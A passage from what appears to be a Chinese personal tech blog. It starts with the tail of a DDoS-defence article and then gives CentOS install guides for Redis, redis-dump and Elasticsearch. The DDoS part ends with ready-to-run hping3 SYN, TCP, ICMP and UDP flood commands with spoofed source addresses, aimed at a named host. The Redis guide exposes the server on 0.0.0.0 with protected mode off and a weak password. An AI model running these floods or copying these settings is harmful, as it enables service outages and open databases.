<p>3，把网站做成静态页面  </p>
<p>4，设定路由器的过滤功能来防止</p>
<p>5，网络设备或主机都需要随时更新其系统漏洞、关闭不需要的服务、安装必要的防 毒和防火墙软件、随时注意系统安全，避免被黑客和自动化的 DDoS 程序植入攻击程序</p>
<p>6，通过隐藏源IP方式可以实现，前提是要先找一个高防的盾机，再把IP隐藏起来(小编认为最有效的是这种方法，不过前提是需要一台服务器)</p>
<p>五，总结</p>
<p>目前开源的ddos攻击工具有很多(攻击成本低，也是DDOS攻击易于发生的原因之一)，但DDOS攻击防御工具并不多，所以作为个人，我们应该定期维护好自己的设备，比如定时更新或者开启防火墙规则，避免被人植入木马，从而成为洪水攻击的帮凶</p>
<p>其他：</p>
<h4 id="Syn-Flood攻击"><a href="#Syn-Flood攻击" class="headerlink" title="Syn Flood攻击"></a>Syn Flood攻击</h4><p>-c 指定连接数<br>-p 目标端口<br>-d 指定数据部分的大小<br>-S 攻击类型是Syn flood<br>–flood 以泛洪的方式攻击<br>–rand-source 随机产生伪造源地址</p>
<p>hping3 -S -P -U -p 80 –flood –rand-source 192.168.100.1<br>-P flag置为Push -U flag置为Urge紧急<br>加这两参数可以提高效率</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 1000 -d 120 -S -p 18280 --flood --rand-source samex.iok.la</span><br></pre></td></tr></table></figure>

<h4 id="TCP-Flood攻击"><a href="#TCP-Flood攻击" class="headerlink" title="TCP Flood攻击"></a>TCP Flood攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -SARUPF -p 18280 --flood --rand-source samex.iok.la</span><br></pre></td></tr></table></figure>

<h4 id="ICMP-Flood攻击"><a href="#ICMP-Flood攻击" class="headerlink" title="ICMP Flood攻击"></a>ICMP Flood攻击</h4><p>-q安静模式 -n不解析域名 -a指定伪造IP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -q -n -d 200 -icmp --flood -a 11.11.11.11 samex.iok.la</span><br></pre></td></tr></table></figure>

<h4 id="UDP-Flood-攻击"><a href="#UDP-Flood-攻击" class="headerlink" title="UDP Flood 攻击"></a>UDP Flood 攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -udp -s 6666 -p 18280 -a 8.8.8.8 --flood samex.iok.la</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/centos_install_redis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/29/centos_install_redis/" class="post-title-link" itemprop="url">centOS 安装 redis</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-29 22:18:29" itemprop="dateCreated datePublished" datetime="2019-11-29T22:18:29+08:00">2019-11-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-08 14:44:20" itemprop="dateModified" datetime="2022-02-08T14:44:20+08:00">2022-02-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="1-下载-redis-包"><a href="#1-下载-redis-包" class="headerlink" title="1. 下载 redis 包"></a><strong>1. 下载 redis 包</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo wget -c http://download.redis.io/releases/redis-5.0.14.tar.gz</span><br><span class="line">sudo tar -zxvf redis-5.0.14.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-5.0.14</span><br><span class="line"></span><br><span class="line">wget https://download.redis.io/releases/redis-6.2.6.tar.gz</span><br><span class="line">tar xzf redis-6.2.6.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-6.2.6</span><br></pre></td></tr></table></figure>

<h2 id="2-编译与安装"><a href="#2-编译与安装" class="headerlink" title="2. 编译与安装"></a><strong>2. 编译与安装</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ./utils/install_server.sh</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">groupadd redis</span><br><span class="line">useradd -M -g redis -s /sbin/nologin redis</span><br><span class="line"><span class="built_in">id</span> redis</span><br><span class="line"><span class="built_in">mkdir</span> -p /data/redis6379/&#123;data,<span class="built_in">log</span>,conf&#125;</span><br><span class="line"><span class="built_in">chown</span> -R redis:redis /data/redis6379</span><br><span class="line"></span><br><span class="line">/data/redis6379/conf/redis_6379.conf</span><br><span class="line">/data/redis6379/log/redis_6379.<span class="built_in">log</span></span><br><span class="line">/data/redis6379/data</span><br><span class="line">/usr/local/bin/redis-server</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /data/redis6379/conf/redis_6379.conf &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">bind 0.0.0.0</span></span><br><span class="line"><span class="string">protected-mode no</span></span><br><span class="line"><span class="string">port 6379</span></span><br><span class="line"><span class="string">tcp-backlog 511</span></span><br><span class="line"><span class="string">timeout 0</span></span><br><span class="line"><span class="string">tcp-keepalive 300</span></span><br><span class="line"><span class="string">daemonize yes</span></span><br><span class="line"><span class="string">pidfile /data/redis6379/conf/redis_6379.pid</span></span><br><span class="line"><span class="string">loglevel notice</span></span><br><span class="line"><span class="string">logfile /data/redis6379/log/redis_6379.log</span></span><br><span class="line"><span class="string">databases 16</span></span><br><span class="line"><span class="string">always-show-logo no</span></span><br><span class="line"><span class="string">set-proc-title yes</span></span><br><span class="line"><span class="string">proc-title-template &quot;&#123;title&#125; &#123;listen-addr&#125; &#123;server-mode&#125;&quot;</span></span><br><span class="line"><span class="string">stop-writes-on-bgsave-error yes</span></span><br><span class="line"><span class="string">rdbcompression yes</span></span><br><span class="line"><span class="string">rdbchecksum yes</span></span><br><span class="line"><span class="string">dbfilename dump.rdb</span></span><br><span class="line"><span class="string">rdb-del-sync-files no</span></span><br><span class="line"><span class="string">dir /data/redis6379/data</span></span><br><span class="line"><span class="string">replica-serve-stale-data yes</span></span><br><span class="line"><span class="string">replica-read-only yes</span></span><br><span class="line"><span class="string">repl-diskless-sync no</span></span><br><span class="line"><span class="string">repl-diskless-sync-delay 5</span></span><br><span class="line"><span class="string">repl-diskless-load disabled</span></span><br><span class="line"><span class="string">repl-disable-tcp-nodelay no</span></span><br><span class="line"><span class="string">replica-priority 100</span></span><br><span class="line"><span class="string">acllog-max-len 128</span></span><br><span class="line"><span class="string">lazyfree-lazy-eviction no</span></span><br><span class="line"><span class="string">lazyfree-lazy-expire no</span></span><br><span class="line"><span class="string">lazyfree-lazy-server-del no</span></span><br><span class="line"><span class="string">replica-lazy-flush no</span></span><br><span class="line"><span class="string">lazyfree-lazy-user-del no</span></span><br><span class="line"><span class="string">lazyfree-lazy-user-flush no</span></span><br><span class="line"><span class="string">oom-score-adj no</span></span><br><span class="line"><span class="string">oom-score-adj-values 0 200 800</span></span><br><span class="line"><span class="string">disable-thp yes</span></span><br><span class="line"><span class="string">appendonly no</span></span><br><span class="line"><span class="string">appendfilename &quot;appendonly.aof&quot;</span></span><br><span class="line"><span class="string">appendfsync everysec</span></span><br><span class="line"><span class="string">no-appendfsync-on-rewrite no</span></span><br><span class="line"><span class="string">auto-aof-rewrite-percentage 100</span></span><br><span class="line"><span class="string">auto-aof-rewrite-min-size 64mb</span></span><br><span class="line"><span class="string">aof-load-truncated yes</span></span><br><span class="line"><span class="string">aof-use-rdb-preamble yes</span></span><br><span class="line"><span class="string">lua-time-limit 5000</span></span><br><span class="line"><span class="string">slowlog-log-slower-than 10000</span></span><br><span class="line"><span class="string">slowlog-max-len 128</span></span><br><span class="line"><span class="string">latency-monitor-threshold 0</span></span><br><span class="line"><span class="string">notify-keyspace-events &quot;&quot;</span></span><br><span class="line"><span class="string">hash-max-ziplist-entries 512</span></span><br><span class="line"><span class="string">hash-max-ziplist-value 64</span></span><br><span class="line"><span class="string">list-max-ziplist-size -2</span></span><br><span class="line"><span class="string">list-compress-depth 0</span></span><br><span class="line"><span class="string">set-max-intset-entries 512</span></span><br><span class="line"><span class="string">zset-max-ziplist-entries 128</span></span><br><span class="line"><span class="string">zset-max-ziplist-value 64</span></span><br><span class="line"><span class="string">hll-sparse-max-bytes 3000</span></span><br><span class="line"><span class="string">stream-node-max-bytes 4096</span></span><br><span class="line"><span class="string">stream-node-max-entries 100</span></span><br><span class="line"><span class="string">activerehashing yes</span></span><br><span class="line"><span class="string">client-output-buffer-limit normal 0 0 0</span></span><br><span class="line"><span class="string">client-output-buffer-limit replica 256mb 64mb 60</span></span><br><span class="line"><span class="string">client-output-buffer-limit pubsub 32mb 8mb 60</span></span><br><span class="line"><span class="string">hz 10</span></span><br><span class="line"><span class="string">dynamic-hz yes</span></span><br><span class="line"><span class="string">aof-rewrite-incremental-fsync yes</span></span><br><span class="line"><span class="string">rdb-save-incremental-fsync yes</span></span><br><span class="line"><span class="string">jemalloc-bg-thread yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">requirepass abcd1234</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>



<h2 id="4-其他修改配置文件："><a href="#4-其他修改配置文件：" class="headerlink" title="4. 其他修改配置文件："></a><strong>4. 其他修改配置文件：</strong></h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">vim /etc/redis/6379.conf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#redis默认处于保护模式，只能通过127.0.0.1本地连接，打开redis安装目录下的redis.conf</span></span><br><span class="line"><span class="comment">#注释bind 127.0.0.1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#redis默认不是以守护线程的方式运行，默认以前端模式运行，修改daemonize为yes，即修改为</span></span><br><span class="line"><span class="attr">daemonize</span> <span class="string">yes</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#修改protected-model为no，即修改为</span></span><br><span class="line"><span class="attr">protected-mode</span> <span class="string">no</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#设置密码</span></span><br><span class="line"><span class="attr">requirepass</span> <span class="string">abcd1234</span></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/redis8001.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Redis persistent key-value database</span><br><span class="line">After=network.target</span><br><span class="line">After=network-online.target</span><br><span class="line">Wants=network-online.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/local/redis/bin/redis-server /data/redis8001/redis8001.conf --supervised systemd</span><br><span class="line">ExecStop=/usr/local/redis/bin/redis-cli -h 127.0.0.1 -p 8001 -a abcd1234 shutdown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Type=notify</span><br><span class="line">User=redis</span><br><span class="line">Group=redis</span><br><span class="line">RuntimeDirectory=redis</span><br><span class="line">RuntimeDirectoryMode=0755</span><br><span class="line">StandardOutput=journal</span><br><span class="line">StandardError=inherit</span><br><span class="line">LimitNOFILE=65536</span><br><span class="line">LimitNPROC=65536</span><br><span class="line">TimeoutStopSec=0</span><br><span class="line">KillSignal=SIGTERM</span><br><span class="line">SendSIGKILL=no</span><br><span class="line">SuccessExitStatus=0</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>4.手动启动测试代码</strong><br>    sudo vim /etc/init.d/redis_6379</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/redis_6379 stop</span><br><span class="line">/etc/init.d/redis_6379 start</span><br><span class="line">/etc/init.d/redis_6379 restart</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim redis_del_key.sh</span><br><span class="line">chmod +x redis_del_key.sh</span><br><span class="line">./redis_del_key.sh [PASSWORD] 匹配的key*</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">redis_comm=/usr/local/redis/bin/redis-cli</span><br><span class="line">redis_ser01=10.251.201.91</span><br><span class="line">redis_port01=8002</span><br><span class="line">redis_ser02=10.251.201.92</span><br><span class="line">redis_port02=8001</span><br><span class="line">redis_ser03=10.251.201.91</span><br><span class="line">redis_port03=8001</span><br><span class="line"></span><br><span class="line">$redis_comm -c -h $redis_ser01 -p $redis_port01 -a $1 keys $2 | xargs -i ./redis-cli -h $redis_ser01 -p $redis_port01 -a $1 del &#123;&#125;</span><br><span class="line">$redis_comm -c -h $redis_ser02 -p $redis_port02 -a $1 keys $2 | xargs -i ./redis-cli -h $redis_ser02 -p $redis_port02 -a $1 del &#123;&#125;</span><br><span class="line">$redis_comm -c -h $redis_ser03 -p $redis_port03 -a $1 keys $2 | xargs -i ./redis-cli -h $redis_ser03 -p $redis_port03 -a $1 del &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>三、    错误处理<br>编译错误zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory<br>make MALLOC=libc</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/centos_install_redis_dump/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/29/centos_install_redis_dump/" class="post-title-link" itemprop="url">centOS 安装 redis</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-29 22:18:29" itemprop="dateCreated datePublished" datetime="2019-11-29T22:18:29+08:00">2019-11-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-09-25 07:33:36" itemprop="dateModified" datetime="2020-09-25T07:33:36+08:00">2020-09-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>1. 安装rvm</strong></p>
<pre><code>gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB

curl -sSL https://get.rvm.io | bash -s stable

find / -name rvm -print

#/usr/local/rvm
#/usr/local/rvm/scripts/rvm
#/usr/local/rvm/bin/rvm
#/usr/local/rvm/src/rvm
#/usr/local/rvm/src/rvm/scripts/rvm
#/usr/local/rvm/src/rvm/bin/rvm
#/usr/local/rvm/src/rvm/lib/rvm
#/usr/local/rvm/lib/rvm

#使rvm生效
source /usr/local/rvm/scripts/rvm</code></pre><p><strong>2. 安装ruby</strong></p>
<pre><code># 查看可以安装的Ruby版本
rvm list known 
# 当前最高的稳定版本是2.5.1
rvm install ruby 2.5.1
#查看ruby版本
ruby --version</code></pre><p><strong>3. 安装redis-dump</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 移除gem自带源,国内连不上</span><br><span class="line">gem sources --remove https://rubygems.org/ </span><br><span class="line"># 添加国内淘宝源</span><br><span class="line">gem sources -a https://ruby.taobao.org/ </span><br><span class="line"># 安装redis-dump</span><br><span class="line">gem install redis-dump –V</span><br><span class="line"></span><br><span class="line">#查看redis-dump版本，安装成功可以开心的备份和还原redis了</span><br><span class="line">redis-dump -v</span><br><span class="line">#redis-dump v0.4.0</span><br></pre></td></tr></table></figure>

<h2 id="使用redis-dump导出数据"><a href="#使用redis-dump导出数据" class="headerlink" title="使用redis-dump导出数据"></a>使用redis-dump导出数据</h2><p>redis转存储json</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-dump -u 127.0.0.1:6378 -a password &gt; redis_6378.json</span><br></pre></td></tr></table></figure>

<p>json还原redis</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;redis_6378.json redis-load -u 127.0.0.1:6379 -a password</span><br></pre></td></tr></table></figure>

<h2 id="Redis集群数据导出导入"><a href="#Redis集群数据导出导入" class="headerlink" title="Redis集群数据导出导入"></a>Redis集群数据导出导入</h2><p>如果是redis集群模式，需要对集群各个实例分别导出导入，如下所示：</p>
<h3 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h3><p>命令（redis-dump -u :password@host:port -d 0 &gt; fileName.json）无密码可省略</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-dump -u IP1:6379 -d 0 &gt; 6379.json</span><br><span class="line">redis-dump -u IP2:6380 -d 0 &gt; 6380.json</span><br><span class="line">redis-dump -u IP3:6381 -d 0 &gt; 6381.json</span><br></pre></td></tr></table></figure>

<p>执行完成命令之后，生成3个json文件，即为集群节点数据，为提升导入效率，可以将文件拷贝到目标集群机进行导入，也可以直接在本机导入。</p>
<h3 id="数据导入"><a href="#数据导入" class="headerlink" title="数据导入"></a>数据导入</h3><p>命令（cat filename.json | redis-load -u :password@host:port -d 0）无密码可省略</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat 6379.json | redis-load -u IP4:6379 -d 0</span><br><span class="line">cat 6380.json | redis-load -u IP5:6379 -d 0</span><br><span class="line">cat 6380.json | redis-load -u IP6:6380 -d 0</span><br></pre></td></tr></table></figure>

<p>注意：导入时json文件源集群节点和目的集群节点键所在的槽要对应，如果json的槽不是由导入节点处理的，会报错：提示MOVED 13596 host:port</p>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>执行redis-dump命令时如果报ERR unknown command ‘keys’异常</p>
<p>原因：keys命令用于全局查询 一般不建议使用所以能在redis.conf中配置了禁用该命令 。<br>解决方案: 检查redis.conf 中是否有该命令禁用配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    rename-command FLUSHALL &quot;&quot;  清空所有的库数据</span><br><span class="line">    rename-command FLUSHDB &quot;&quot;      清空当前库数据</span><br><span class="line">    rename-command KEYS &quot;&quot;        查询所有库数据 （因为数据量大时，执行此操作会消耗大量的资源 一般不建议使用该命令)</span><br><span class="line">如果有注释掉即可 ！</span><br></pre></td></tr></table></figure>



<p><strong>如果报错，请使用-n选项，使用请参考官方，请谨慎使用</strong>！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt; test.json redis-load -n //-n （以二进制形式导入）</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/08/centos_install_es/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/08/centos_install_es/" class="post-title-link" itemprop="url">centOS 安装 nginx</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-08 17:26:29" itemprop="dateCreated datePublished" datetime="2019-11-08T17:26:29+08:00">2019-11-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-19 21:14:46" itemprop="dateModified" datetime="2020-12-19T21:14:46+08:00">2020-12-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>1. 下载nginx包</strong></p>
<pre><code>wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.10.1-linux-x86_64.tar.gz
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.10.1-linux-x86_64.tar.gz.sha512
shasum -a 512 -c elasticsearch-7.10.1-linux-x86_64.tar.gz.sha512 
tar -xzf elasticsearch-7.10.1-linux-x86_64.tar.gz
mv elasticsearch-7.10.1/  /usr/local/es</code></pre><p><strong>2. 配置与编译</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cluster.name:</span> <span class="string">my-application</span></span><br><span class="line"><span class="attr">node.name:</span> <span class="string">node-1</span></span><br><span class="line"><span class="attr">bootstrap.memory_lock:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">path.data:</span> <span class="string">/data/esdata</span></span><br><span class="line"><span class="attr">path.logs:</span> <span class="string">/data/logs/es</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">http.port:</span> <span class="number">9200</span></span><br><span class="line"><span class="attr">cluster.initial_master_nodes:</span> [<span class="string">&quot;node-1&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3. 设置开机启动</strong></p>
<pre><code>sudo adduser elasticsearch
mkdir /data/esdata
mkdir /data/logs/es
sudo chown -R elasticsearch:elasticsearch /usr/local/es
sudo chown -R elasticsearch:elasticsearch /data/logs/es
sudo chown -R elasticsearch:elasticsearch /data/esdata</code></pre><p>文件内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /usr/lib/systemd/system/elasticsearch.service &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[Unit]</span></span><br><span class="line"><span class="string">Description=elasticsearch</span></span><br><span class="line"><span class="string">[Service]</span></span><br><span class="line"><span class="string">User=elasticsearch</span></span><br><span class="line"><span class="string">LimitNOFILE=100000</span></span><br><span class="line"><span class="string">LimitNPROC=100000</span></span><br><span class="line"><span class="string">ExecStart=/usr/local/es/bin/elasticsearch</span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>设置自动启动</p>
<p><strong>4.手动启动测试代码</strong></p>
<pre><code># Unable to lock JVM Memory: error=12,reason=Cannot allocate memory
vim /usr/lib/systemd/system/elasticsearch.service
增加 LimitMEMLOCK=infinity </code></pre>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/08/centos_install_nexus/">

